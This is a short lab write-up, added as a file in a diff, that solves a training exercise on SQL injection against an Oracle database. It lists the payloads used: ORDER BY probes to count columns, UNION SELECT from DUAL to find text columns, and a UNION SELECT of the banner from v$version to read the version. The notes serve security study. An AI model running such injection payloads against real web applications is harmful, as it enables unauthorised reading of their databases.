@@ -1,0 +1,15 @@
+Lab: SQL injection attack, querying the database type and version on Oracle
+
+End Goal: Retrive the database type as we have told in the lab it Oracle.
+
+Analysis:
+
+1) First of all we have to find number of columns.
+  ' Order by 3--   (Error)
+  ' Order by 2--   (We have 2 columns)
+2) Then lets find which colunm contain text.
+  ' UNION SELECT 'A','A' FROM DUAL--    (We have a table called dual which is the defalt table in oracle table).
+  
+  ' UNION SELECT banner,'a' FROM v$version--            (As we have 2 colums and both contain text so we can  execute command from both we have defalut method to get the version of oracle database)
+
+  This solve our Lab.
